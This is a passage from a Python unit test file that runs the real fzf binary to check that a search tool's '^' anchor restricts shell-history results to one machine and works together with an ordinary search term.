        anchors `^` to the age column and breaks the feature outright -- left
        every assertion below passing.
        """
        argv = search._fzf_argv("global", "", dedup=True, host_width=8)
        matching = [arg for arg in argv if arg.startswith("--nth=") or arg == "--ansi"]
        self.assertTrue(matching, "no matching flags found; _fzf_argv changed shape")
        return subprocess.run(
            ["fzf", "--filter", query, *matching],
            input="\n".join(self.ROWS),
            text=True,
            capture_output=True,
            check=False,
        ).stdout

    @unittest.skipUnless(shutil.which("fzf"), "fzf required")
    def test_the_anchor_really_does_restrict_to_the_machine(self) -> None:
        """Driven through the real fzf, because the whole claim is about how fzf
        resolves `^` against a field range -- which no assertion about our own
        strings can check."""
        got = self.fzf_filter("^box")
        chosen = sorted(line.split()[1] for line in got.splitlines() if line.strip())
        self.assertEqual(chosen, ["box", "box"], "the anchor did not restrict to the machine")

    @unittest.skipUnless(shutil.which("fzf"), "fzf required")
    def test_it_composes_with_an_ordinary_search(self) -> None:
        """Filtering to a machine is worth little if it cannot then be searched,
        and that is two terms in one query rather than a mode to leave."""
        got = self.fzf_filter("^box docker")
        self.assertIn("docker run sandbox", got)
        self.assertNotIn("docker ps", got, "another machine survived the anchor")
        self.assertNotIn("  ls", got, "the second term was ignored")
